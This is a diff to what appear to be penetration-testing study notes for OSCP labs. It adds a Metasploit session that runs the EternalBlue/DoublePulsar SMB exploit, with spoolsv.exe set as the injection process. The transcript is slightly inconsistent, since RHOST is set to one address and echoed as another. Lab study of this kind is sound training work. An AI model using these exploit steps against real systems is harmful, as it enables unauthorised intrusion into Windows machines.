@@ -2190,7 +2190,19 @@ apt-get install pocl-opencl-icd
 
       4. Start metasploit console
 ```
-       
+
+I found that using spoolsv.exe as the PROCESSINJECT yielded results on OSCP boxes.
+
+```
+use exploit/windows/smb/eternalblue_doublepulsar
+msf exploit(eternalblue_doublepulsar) > set RHOST 10.10.10.10
+RHOST => 10.11.1.73
+msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT spoolsv.exe
+PROCESSINJECT => spoolsv.exe
+msf exploit(eternalblue_doublepulsar) > run
+
+```
+
 
 -   Experimenting with Meterpreter
 
